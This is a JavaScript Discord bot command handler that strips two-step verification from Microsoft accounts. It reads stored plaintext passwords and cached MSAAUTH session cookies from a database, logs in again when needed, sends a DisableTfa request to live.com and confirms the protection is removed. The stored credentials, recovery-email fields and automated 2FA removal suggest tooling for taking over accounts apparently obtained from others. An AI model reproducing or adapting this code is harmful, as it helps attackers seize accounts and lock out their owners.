const accountsmsg = require("../../utils/accounts/accountsmsg");
const { queryParams } = require("../../../db/database");
const isOwner = require("../../../db/isOwner");
const HttpClient = require("../../utils/process/HttpClient");
const disableTfa = require("../../utils/secure/disableTfa");
const { getSecurityProofsRaw } = require("../../utils/secure/securityInformation");
const login = require("../../utils/secure/login");
const getCookies = require("../../utils/secure/getCookies");
const polishHost = require("../../utils/secure/polishHost");

module.exports = {
    name: "disable2fa",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            const parts = interaction.customId.split("|");
            let userId = null;
            let uid = null;

            if (parts.length >= 3) {
                userId = parts[1];
                uid = parts[2];
            } else if (parts.length === 2) {
                uid = parts[1];
                userId = interaction.user.id;
            }

            if (!uid) {
                return interaction.reply({
                    content: "Missing account identifier.",
                    ephemeral: true
                });
            }

            // Verify user authorization: account owner or admin
            const isUserOwner = await isOwner(interaction.user.id);
            if (userId && interaction.user.id !== userId && !isUserOwner) {
                return interaction.reply({
                    content: "You do not have permission to modify security settings for this account.",
                    ephemeral: true
                });
            }

            // Defer update in-place to allow processing time
            await interaction.deferUpdate().catch(() => {});

            // Load account from database
            const accountRows = await queryParams("SELECT * FROM accounts WHERE uid = ?", [uid]);
            if (!accountRows || accountRows.length === 0) {
                return interaction.followUp({
                    content: "The requested account could not be found.",
                    ephemeral: true
                });
            }
            const account = accountRows[0];

            // Verify if 2FA is already recorded as disabled
            if (account.secretkey === "Disabled" || account.secretkey === "Option is disabled.") {
                const refreshedMsg = await accountsmsg(userId, null, uid);
                await interaction.editReply(refreshedMsg);
                return;
            }

            // Load security session state from status table
            const statusRows = await queryParams("SELECT msauth, password, secemail, email FROM status WHERE uid = ?", [uid]);
            let msauth = statusRows?.[0]?.msauth || null;
            const password = statusRows?.[0]?.password || account.password || null;
            const email = statusRows?.[0]?.email || account.email || null;

            const axios = new HttpClient(true);

            // Re-authenticate if msauth session cookie is missing or invalid
            if (!msauth && email && password && password !== "unauthed" && password !== "Not set") {
                console.log(`[DISABLE_2FA] Session cookie not cached for ${uid}, re-authenticating...`);
                try {
                    const host = await login({ email, pw: password });
                    if (host) {
                        const cookieResult = await getCookies();
                        if (cookieResult && cookieResult[1]) {
                            msauth = await polishHost(host, cookieResult[1]);
                        } else {
                            msauth = host;
                        }
                        await queryParams("UPDATE status SET msauth = ? WHERE uid = ?", [msauth, uid]);
                    }
                } catch (loginErr) {
                    console.error("[DISABLE_2FA] Re-authentication error:", loginErr.message);
                }
            }

            if (msauth) {
                axios.setCookie(`__Host-MSAAUTH=${msauth}; Domain=.live.com; Path=/`);
                axios.setCookie(`__Host-MSAAUTHP=${msauth}; Domain=.live.com; Path=/`);
            }

            // Inspect current authoritative proofs on Microsoft server
            let initialProofs = null;
            try {
                initialProofs = await getSecurityProofsRaw(axios);
            } catch (proofErr) {
                console.error("[DISABLE_2FA] Failed to inspect security proofs:", proofErr.message);
            }

            let canary = initialProofs?.canary || null;
            const isInitiallyEnabled = initialProofs?.twoStepVerification === true || initialProofs?.raw?.tfaEnabled === 1;

            // If Microsoft already reports 2FA as disabled, synchronize local state
            if (initialProofs && !isInitiallyEnabled && initialProofs.raw && Object.keys(initialProofs.raw).length > 0) {
                console.log(`[DISABLE_2FA] Microsoft reports 2FA is already disabled for ${uid}`);
                await queryParams("UPDATE accounts SET secretkey = 'Disabled' WHERE uid = ?", [uid]);
                await queryParams("UPDATE status SET secretkey = 'Disabled' WHERE uid = ?", [uid]);
                const updatedMsg = await accountsmsg(userId, null, uid);
                await interaction.editReply(updatedMsg);
                return;
            }

            // Perform 2FA disable mutation
            console.log(`[DISABLE_2FA] Sending DisableTfa request for UID ${uid}...`);
            const mutationResult = await disableTfa(axios, canary);

            // Authoritatively verify resulting state from Microsoft server (no fake success based only on 200)
            let verifiedProofs = null;
            try {
                verifiedProofs = await getSecurityProofsRaw(axios);
            } catch (vErr) {
                console.error("[DISABLE_2FA] Error during post-mutation verification:", vErr.message);
            }

            const isStillEnabled = verifiedProofs?.twoStepVerification === true || verifiedProofs?.raw?.tfaEnabled === 1;

            if (isStillEnabled || (!mutationResult && (!verifiedProofs || !verifiedProofs.raw))) {
                console.log(`[DISABLE_2FA] State verification failed: 2FA remains active on server for ${uid}`);
                return interaction.followUp({
                    content: "Could not disable 2FA: Microsoft did not remove Two-Step Verification. Please verify your account session or try again later.",
                    ephemeral: true
                });
            }

            console.log(`[DISABLE_2FA] Verified: 2FA successfully disabled on Microsoft server for ${uid}`);

            // Persist verified state in database
            await queryParams("UPDATE accounts SET secretkey = 'Disabled' WHERE uid = ?", [uid]);
            await queryParams("UPDATE status SET secretkey = 'Disabled' WHERE uid = ?", [uid]);

            // Update Discord Embed automatically in-place
            const updatedMessage = await accountsmsg(userId, null, uid);
            await interaction.editReply(updatedMessage);

        } catch (error) {
            console.error("[DISABLE_2FA] Unexpected error in disable2fa handler:", error.message);
            if (interaction.deferred || interaction.replied) {
                return interaction.followUp({
                    content: "An error occurred while processing the request to disable 2FA.",
                    ephemeral: true
                }).catch(() => {});
            } else {
                return interaction.reply({
                    content: "An error occurred while processing the request to disable 2FA.",
                    ephemeral: true
                }).catch(() => {});
            }
        }
    }
};
